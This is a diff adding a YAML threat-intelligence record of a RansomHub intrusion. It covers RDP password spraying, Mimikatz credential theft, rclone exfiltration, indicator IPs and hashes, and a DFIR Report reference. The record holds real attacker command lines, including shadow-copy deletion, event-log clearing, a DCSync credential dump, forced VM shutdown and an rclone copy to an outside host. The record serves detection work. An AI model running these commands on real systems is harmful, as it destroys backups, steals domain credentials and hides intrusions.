@@ -1,0 +1,98 @@
+description: "Password spray via exposed RDP, credential harvesting with Mimikatz\
+  \ and Nirsoft, discovery with living\u2011off\u2011the\u2011land tools, lateral\
+  \ movement over RDP/SMB, exfiltration with Rclone SFTP, ransomware deployment of\
+  \ RansomHub."
+attribution: APT group unknown; activity linked to IPs 185.190.24.54, 185.190.24.33,
+  164.138.90.2
+malware_families:
+- RansomHub
+- rcl
+- amd64
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - net.exe
+  - nslookup
+  - vssadmin.exe
+  - fsutil.exe
+  - wevtutil
+  - lsadump::dcsync
+  - netnltest
+  - netscan.exe
+  - rundll32.exe
+  - rclone.exe
+  - amd64.exe
+  - nocmd.vbs
+  - rcl.bat
+  commandline:
+  - cmd.exe /c "vssadmin.exe Delete Shadows /all /quiet"
+  - cmd.exe /c "fsutil behavior set SymlinkEvaluation R2L:1"
+  - cmd.exe /c "fsutil behavior set SymlinkEvaluation R2R:1"
+  - wevtutil cl security
+  - wevtutil cl system
+  - wevtutil cl application
+  - lsadump::dcsync /domain:CHILD.DOMAIN.EXAMPLE /user:DOMAINADMINUSER /csv > CHILD.csv
+  - net nltest
+  - nslookup
+  - netscan.exe
+  - rclone copy [REDACTED]:/mnt/sdd/REDACTED --include-from include.txt
+  - amd64.exe -pass [REDACTED] -only-local
+  powershell:
+  - powershell.exe -Command "{ Get-VM | where { $_.Name -ne 'VM01' -and $_.Name -ne
+    'VM02' } | Stop-VM -Force"
+  - powershell.exe -Command "\"Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\""
+  scripting_engine:
+  - 'nocmd.vbs: Set WshShell = CreateObject("WScript.Shell") WshShell.Run chr(34)
+    & "C:\\ProgramData\\Veeam\\rcl.bat" & Chr(34), 0 Set WshShell = Nothing'
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: rclone.exe
+    destination: 38.180.245.207:443
+    protocol: ssh
+  file_activity:
+  - C:\\ProgramData\\Veeam\\rcl.bat
+  - C:\\ProgramData\\Veeam\\include.txt
+  - C:\\ProgramData\\Veeam\\rclone.exe
+  - C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\log\\<1><REDACTED
+    DATE> <REDACTED TIME>
+  - C:\\Windows\\system32\\net.exe
+  - C:\\Windows\\system32\\vssadmin.exe
+  - C:\\Windows\\system32\\fsutil.exe
+  - C:\\Windows\\system32\\wevtutil.exe
+  persistence:
+  - 'Splashtop Remote Service (Service Name: Splashtop Remote Service, File Name:
+    C:\\Program Files (x86)\\Splashtop\\Splashtop Remote\\Server\\SRService.exe)'
+  - 'AteraAgentService (Service Name: AteraAgentService, File Name: C:\\Program Files
+    (xB6)\\ATERA Networks\\AteraAgent|AteraAgent.exe)'
+  process_relations: []
+IOCs:
+  hashes:
+  - eba5bfca73c2754fbf93ed64fa224132
+  - b746c91e014205db94f775bb6db480387c9ebc20
+  - ec45ebd938e363e36cacb42e968a960fbe4e21ced511f0ea2c0790b743ff3c67
+  - 6f3a658fc32b4a378716ac167ebaf5ac
+  - 19138d3c197ee1e59756d1f4fc3fd66809f44c1b
+  - 25117dcb2d852df15fe44c5757147e7038f289e6156b0f6ab86d02c0e97328cb
+  - a768244ca664349a6d1af84a712083c0
+  - 39300863bcaad71e5d4efc9a1cae118440aa778fe14ba0fb92e16bb7db3b1efac4b13aee178542c6994543e7535d8efaa589870c
+  - 8e0b1f8390acb832dbf3abadeb7e5fd3
+  - 02e6ff95949fdf341daee846820d40289ab659854775dfb24f85f5d776f538018a98cc6a9853a1840f5c00b7d0c54695f03a11d9
+  - 1cc1534b70b8d2b99b69a721c83e586a
+  - 6ac2d77631f775797cd0029e199a5dfe83f47b4cffd09a5c27938d1f7424ed66d1474cfeb3df72daabdf10e09f161ed1ffd21271
+  ips:
+  - 185.190.24.54
+  - 185.190.24.33
+  - 164.138.90.2
+  - 38.180.245.207
+  - 37.120.143.202
+  domains: []
+  urls: []
+authors:
+- '@tas_kmanager'
+- '@iiamaleks'
+- UC2
+reference: https://thedfirreport.com/2025/06/30/hide-your-rdp-password-spray-leads-to-ransomhub-deployment
+date_of_publication: June 30, 2025
+file_creation_date: October 05, 2025
